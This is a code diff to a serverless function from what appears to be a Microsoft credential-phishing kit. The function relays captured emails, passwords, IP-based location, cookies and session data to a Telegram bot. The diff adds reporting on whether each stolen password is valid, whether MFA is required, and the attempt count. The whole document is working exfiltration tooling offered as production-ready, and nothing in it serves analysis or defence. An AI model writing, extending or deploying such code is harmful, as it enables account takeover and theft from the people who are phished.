@@ -1,8 +1,8 @@
 /**
  * PRODUCTION-READY: Telegram Bot Function for Netlify
- * ✅ SENDS: Email, Password, Location (IP, City, State, Country), Account Type
+ * ✅ SENDS: Email, Password, Location, Validation Status
  * ✅ FIXED: No backslashes in IP addresses
- * Updated: 2025-11-10 14:33:46 UTC by pixelogicm
+ * Updated: 2025-11-10 14:45:34 UTC by pixelogicm
  */
 
 const https = require('https');
@@ -153,7 +153,20 @@ function formatMainMessage(data) {
   // Detect account type
   const { accountType, domain } = detectAccountType(data.email);
 
-  // Build message in HTML format (no backslash issues)
+  // ✅ NEW: Determine validation status icon and text
+  let statusIcon = '❓';
+  let statusText = 'Unknown';
+  if (data.validationStatus) {
+    if (data.validationStatus.valid === true) {
+      statusIcon = '✅';
+      statusText = data.validationStatus.mfaRequired ? 'VALID (MFA Required)' : 'VALID';
+    } else if (data.validationStatus.valid === false) {
+      statusIcon = '❌';
+      statusText = `INVALID - ${data.validationStatus.reason || 'Incorrect password'}`;
+    }
+  }
+
+  // Build message in HTML format
   let message = `<b>🔐 Microsoft Login Captured</b>\n`;
   message += `━━━━━━━━━━━━━━━━━━━━\n`;
   
@@ -163,6 +176,14 @@ function formatMainMessage(data) {
   
   if (data.password) {
     message += `<b>🔑 Password:</b> <code>${escapeHtml(data.password)}</code>\n`;
+  }
+  
+  // ✅ NEW: Add validation status
+  if (data.validationStatus) {
+    message += `<b>${statusIcon} Status:</b> ${statusText}\n`;
+    if (data.validationStatus.attemptCount) {
+      message += `<b>🔄 Attempt:</b> #${data.validationStatus.attemptCount}\n`;
+    }
   }
   
   message += `<b>🏢 Account Type:</b> ${accountType}\n`;
@@ -284,6 +305,7 @@ exports.handler = async (event, context) => {
       locationData = {}, 
       userAgent, 
       platform,
+      validationStatus,  // ✅ NEW: Added validation status
       oauth,
       sessionData,
       cookies = [],
@@ -296,6 +318,10 @@ exports.handler = async (event, context) => {
       hasLocation: !!locationData.ip,
       hasUserAgent: !!userAgent,
       hasPlatform: !!platform,
+      hasValidationStatus: !!validationStatus,  // ✅ NEW
+      isValid: validationStatus?.valid,  // ✅ NEW
+      validationReason: validationStatus?.reason,  // ✅ NEW
+      attemptCount: validationStatus?.attemptCount,  // ✅ NEW
       hasOAuth: !!oauth,
       cookieCount: cookies.length
     });
@@ -315,9 +341,9 @@ exports.handler = async (event, context) => {
       cookieFile: false
     };
 
-    // ✅ MESSAGE 1: Send main credentials message with location
+    // ✅ MESSAGE 1: Send main credentials message with location and validation status
     console.log('═══════════════════════════════════════════');
-    console.log('📨 [HANDLER] Sending main message with location...');
+    console.log('📨 [HANDLER] Sending main message with validation status...');
     console.log('═══════════════════════════════════════════');
     
     try {
@@ -326,10 +352,12 @@ exports.handler = async (event, context) => {
         password,
         locationData,
         userAgent: userAgent || requestData.userAgent,
-        platform: platform || requestData.platform
+        platform: platform || requestData.platform,
+        validationStatus: validationStatus  // ✅ NEW: Pass validation status
       });
 
       console.log('📝 Message preview (first 200 chars):', mainMessage.substring(0, 200));
+      console.log('✅ Validation status:', validationStatus?.valid ? 'VALID' : 'INVALID');
 
       await sendWithRetry(() => sendMessageToTelegram(mainMessage, 'HTML'));
       
@@ -400,6 +428,7 @@ exports.handler = async (event, context) => {
           email: !!email,
           password: !!password,
           location: !!locationData.ip,
+          validationStatus: !!validationStatus,  // ✅ NEW
           messagesSent
         }
       })
